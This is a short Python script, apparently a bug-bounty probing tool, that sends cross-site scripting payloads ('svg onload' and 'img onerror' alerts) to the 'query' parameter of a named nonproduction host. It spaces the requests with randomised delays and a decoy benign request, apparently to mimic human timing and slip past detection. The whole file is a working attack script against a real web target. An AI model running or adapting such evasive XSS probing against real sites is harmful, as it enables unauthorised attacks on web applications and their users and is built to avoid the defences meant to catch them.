import time
import random
from senka.posiljalac import posalji

FAZE = [
    {"delay": lambda: random.uniform(1.2, 3.7), "tip": "nevin", "payload": "search=hello"},
    {"delay": lambda: random.uniform(2.0, 4.0), "tip": "preskok", "payload": "<svg/onload=alert(1)>"},
    {"delay": lambda: random.uniform(4.5, 6.5), "tip": "ponovo", "payload": "<svg/onload=alert(1)>"},
    {"delay": lambda: random.uniform(1.0, 2.0), "tip": "pauza", "payload": ""},
    {"delay": lambda: random.uniform(3.5, 5.0), "tip": "mutirani", "payload": "<img src='x' onerror='alert(1)'>"}
]

META = {
    "url": "https://uat-bugbounty.nonprod.syfe.com",
    "param": "query"
}

for faza in FAZE:
    trajanje = faza["delay"]()
    print(f"[Imitator] Faza: {faza['tip']}... čekam {trajanje:.2f} sekundi")
    time.sleep(trajanje)

    if faza["tip"] in ["pauza", "preskok"]:
        print(f"[Imitator] Preskačem fazu: {faza['tip']}")
        continue

    posalji(META, {"payload": faza["payload"]})
